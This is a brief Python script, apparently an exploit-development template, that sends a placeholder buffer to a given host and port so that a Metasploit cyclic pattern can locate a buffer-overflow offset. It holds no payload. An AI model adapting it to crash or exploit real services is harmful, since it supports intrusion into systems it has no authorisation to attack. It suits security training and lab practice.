import socket
import time
import sys

if len(sys.argv) < 3:
    print("usage: \"python offset.py [host] [port]\"")
    print("usage: also don't forget to change the inputBuffer value!")
    exit(0)

host = sys.argv[1]
port = sys.argv[2]

inputBuffer = "replace me!"

if inputBuffer == "replace me!":
    print("usage: you need to replace the buffer with a pattern offset!")
    print("usage: this can be done with \"msf-pattern-create -l [size]")
    exit(0)

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((host,port))
print("sending buffer")
s.send(inputBuffer)
s.recv(1024)
s.close()
     



